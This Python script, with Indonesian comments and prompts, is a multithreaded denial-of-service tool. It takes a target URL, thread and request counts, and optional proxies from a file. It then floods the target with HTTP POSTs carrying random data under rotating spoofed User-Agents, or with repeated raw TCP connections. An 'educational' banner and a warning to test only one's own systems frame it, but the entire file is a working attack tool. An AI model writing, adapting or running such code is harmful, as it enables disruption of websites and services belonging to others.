import threading
import random
import requests
import time
import sys
import os
import socket

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           DDoS Attack Tool v2.0      ║
    ║        For Educational Purpose       ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def main():
    clear_screen()
    print_banner()

    print("⚠️  PERINGATAN: Hanya untuk testing sistem sendiri!")
    print("=" * 50)

    # Konfigurasi
    try:
        url = input("Masukkan URL target: ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        threads = int(input("Masukkan jumlah thread (1-200): "))
        threads = max(1, min(threads, 200))  # Limit threads

        requests_per_thread = int(input("Masukkan jumlah request per thread (1-2000): "))
        requests_per_thread = max(1, min(requests_per_thread, 2000))  # Limit requests

        use_proxies = input("Gunakan proxy? (y/n): ").lower() == "y"
        
        # Tambahkan metode serangan
        attack_method = input("Pilih metode serangan (HTTP/TCP): ").upper()
        if attack_method not in ["HTTP", "TCP"]:
            print("Metode serangan tidak valid. Menggunakan HTTP sebagai default.")
            attack_method = "HTTP"

    except ValueError:
        print("Error: Masukkan angka yang valid!")
        return
    except KeyboardInterrupt:
        print("\nProgram dihentikan oleh user")
        return

    # Daftar User-Agent acak
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    ]

    # Daftar proxy (jika digunakan)
    proxies = []
    if use_proxies:
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✓ Loaded {len(proxies)} proxies from proxies.txt")
        except FileNotFoundError:
            print("✗ File proxies.txt tidak ditemukan. Tidak menggunakan proxy.")
            use_proxies = False

    print(f"\n🎯 Target: {url}")
    print(f"🧵 Threads: {threads}")
    print(f"📨 Requests per thread: {requests_per_thread}")
    print(f"🔌 Proxy: {'Yes' if use_proxies else 'No'}")
    print(f"💥 Metode Serangan: {attack_method}")
    print("=" * 50)
    
    confirm = input("Lanjutkan? (y/n): ").lower()
    if confirm != 'y':
        print("Operasi dibatalkan")
        return

    # Counter untuk request berhasil/gagal
    success_count = 0
    fail_count = 0
    counter_lock = threading.Lock()

    # Fungsi untuk mengirim permintaan HTTP
    def http_attack(thread_id):
        nonlocal success_count, fail_count
        for i in range(requests_per_thread):
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.5",
                }
                data = {"data": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=1024))} # Kirim data acak
                
                if use_proxies and proxies:
                    proxy = random.choice(proxies)
                    try:
                        response = requests.post(url, headers=headers, data=data, 
                                               proxies={"http": proxy, "https": proxy}, timeout=5)
                        with counter_lock:
                            success_count += 1
                        print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    except:
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Proxy failed")
                else:
                    response = requests.post(url, headers=headers, data=data, timeout=5)
                    with counter_lock:
                        success_count += 1
                    print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    
            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Error: {str(e)[:50]}...")
            
            time.sleep(0.05)  # Kurangi delay untuk meningkatkan kecepatan

    # Fungsi untuk mengirim permintaan TCP
    def tcp_attack(thread_id):
        nonlocal success_count, fail_count
        for i in range(requests_per_thread):
            try:
                # Ekstrak hostname dan port dari URL
                parsed_url = urllib.parse.urlparse(url)
                hostname = parsed_url.netloc
                port = 80 if parsed_url.scheme == 'http' else 443  # Default ports

                # Buat socket TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)  # Timeout 5 detik

                if use_proxies and proxies:
                    proxy = random.choice(proxies)
                    try:
                        # Konfigurasi proxy (perlu library tambahan seperti PySocks)
                        # Implementasi proxy TCP memerlukan library dan konfigurasi tambahan
                        print(f"✗ Thread {thread_id}: TCP melalui proxy belum diimplementasikan")
                        with counter_lock:
                            fail_count += 1
                    except:
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Proxy failed")
                        sock.close()
                        continue
                else:
                    try:
                        sock.connect((hostname, port))
                        # Kirim data sampah
                        message = "GET / HTTP/1.1\r\nHost: " + hostname + "\r\n\r\n"
                        sock.sendall(message.encode())
                        with counter_lock:
                            success_count += 1
                        print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - TCP sent")
                    except socket.error as e:
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - TCP Error: {str(e)}")
                    finally:
                        sock.close()

            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Error: {str(e)[:50]}...")
            
            time.sleep(0.05)  # Kurangi delay untuk meningkatkan kecepatan

    print("\n🚀 Memulai serangan...")
    start_time = time.time()

    # Membuat dan menjalankan thread
    threads_list = []
    for i in range(threads):
        if attack_method == "HTTP":
            thread = threading.Thread(target=http_attack, args=(i+1,))
        else:
            thread = threading.Thread(target=tcp_attack, args=(i+1,))
        threads_list.append(thread)
        thread.start()

    # Menunggu semua thread selesai
    for thread in threads_list:
        thread.join()

    end_time = time.time()
    duration = end_time - start_time
    
    print("\n" + "=" * 50)
    print("📊 SERANGAN SELESAI!")
    print(f"⏱️  Durasi: {duration:.2f} detik")
    print(f"✅ Request berhasil: {success_count}")
    print(f"❌ Request gagal: {fail_count}")
    print(f"📨 Total request: {success_count + fail_count}")
    print("=" * 50)

if __name__ == "__main__":
    import urllib.parse
    main()
